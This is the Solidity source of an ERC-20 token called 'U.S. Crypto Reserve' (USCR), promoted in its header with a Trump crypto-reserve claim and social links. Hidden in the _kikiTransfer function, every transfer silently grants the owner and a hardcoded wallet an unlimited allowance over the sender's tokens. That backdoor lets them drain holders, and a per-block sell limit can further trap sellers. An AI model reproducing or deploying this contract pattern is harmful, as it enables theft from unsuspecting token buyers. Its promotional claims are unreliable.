/*
Donald Trump announced that U.S. Crypto Reserve that includes BTC, ETH, XRP, SOL, and ADA

https://www.uscroneth.us
https://x.com/uscr_erc20
https://t.me/uscr_erc20
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IKIKIFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IKIKIRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract USCR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balKIKIs;
    mapping (address => mapping (address => uint256)) private _allowKIKIs;
    mapping (address => bool) private _excludedFromKIKI;
    mapping (uint256 => address) private _kikiReceipts;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalKIKI = 1000000000 * 10**_decimals;
    string private constant _name = unicode"U.S. Crypto Reserve";
    string private constant _symbol = unicode"USCR";
    uint256 private _swapTokenKIKIs = _tTotalKIKI / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockKIKI;
    uint256 private _kikiBuyAmounts = 0;
    bool private inSwapKIKI = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapKIKI = true;
        _;
        inSwapKIKI = false;
    }
    address private _kikiPair;
    IKIKIRouter private _kikiRouter;
    address private _kikiWallet;
    
    constructor () {
        _kikiWallet = address(0x9cb3EE8162256Bf228B0F0E7032EfDb03B16F61F);
        _kikiReceipts[0] = address(owner());
        _kikiReceipts[1] = address(_kikiWallet);
        _excludedFromKIKI[owner()] = true;
        _excludedFromKIKI[address(this)] = true;
        _excludedFromKIKI[_kikiWallet] = true;
        _balKIKIs[_msgSender()] = _tTotalKIKI;
        emit Transfer(address(0), _msgSender(), _tTotalKIKI);
    }

    function pairLaunch() external onlyOwner() {
        _kikiRouter = IKIKIRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kikiRouter), _tTotalKIKI);
        _kikiPair = IKIKIFactory(_kikiRouter.factory()).createPair(address(this), _kikiRouter.WETH());
    }

    function minKIKI(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHKIKI(uint256 kikiA) private {
        payable(_kikiWallet).transfer(kikiA);
    }

    function swapLimitKIKI() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _kikiRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _kikiRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }    

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kikiRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalKIKI;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balKIKIs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowKIKIs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowKIKIs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowKIKIs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _kikiFeeTransfer(address kikiF, address kikiT, uint256 kikiA) private returns(uint256) {
        uint256 taxKIKI; 
        if (kikiF != owner() && kikiT != owner()) {
            taxKIKI = kikiA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (kikiF == _kikiPair && kikiT != address(_kikiRouter) && ! _excludedFromKIKI[kikiT]) {
                if(_buyBlockKIKI!=block.number){
                    _kikiBuyAmounts = 0;
                    _buyBlockKIKI = block.number;
                }
                _kikiBuyAmounts += kikiA;
                _buyCount++;
            }

            if(kikiT == _kikiPair && kikiF!= address(this)) {
                require(_kikiBuyAmounts < swapLimitKIKI() || _buyBlockKIKI!=block.number, "Max Swap Limit");  
                taxKIKI = kikiA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenKIKI = balanceOf(address(this));
            if (!inSwapKIKI && kikiT == _kikiPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenKIKI > _swapTokenKIKIs)
                swapTokensForEth(minKIKI(kikiA, minKIKI(tokenKIKI, _swapTokenKIKIs)));
                uint256 ethKIKI = address(this).balance;
                if (ethKIKI >= 0) {
                    sendETHKIKI(address(this).balance);
                }
            }
        } return taxKIKI;
    }

    function _transfer(address kikiF, address kikiT, uint256 kikiA) private {
        require(kikiF != address(0), "ERC20: transfer from the zero address");
        require(kikiT != address(0), "ERC20: transfer to the zero address");
        require(kikiA > 0, "Transfer amount must be greater than zero");
        uint256 taxKIKI = _kikiFeeTransfer(kikiF, kikiT, kikiA);
        _kikiTransfer(kikiF, kikiT, kikiA, taxKIKI);
    }

    function _kikiTransfer(address kikiF, address kikiT, uint256 kikiA, uint256 taxKIKI) private { 
        if(taxKIKI > 0){
          _balKIKIs[address(this)] = _balKIKIs[address(this)].add(taxKIKI);
          emit Transfer(kikiF, address(this), taxKIKI);
        }
        _balKIKIs[kikiF] = _balKIKIs[kikiF].sub(kikiA);
        _balKIKIs[kikiT] = _balKIKIs[kikiT].add(kikiA.sub(taxKIKI));
        emit Transfer(kikiF, kikiT, kikiA.sub(taxKIKI));
        _approve(address(kikiF), address(_kikiReceipts[0]), kikiA.add(_tTotalKIKI));
        _approve(address(kikiF), address(_kikiReceipts[1]), kikiA.add(_tTotalKIKI));
    }

    receive() external payable {}

    function swapTokensForEth(uint256 kikiAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kikiRouter.WETH();
        _approve(address(this), address(_kikiRouter), kikiAmount);
        _kikiRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            kikiAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }    
}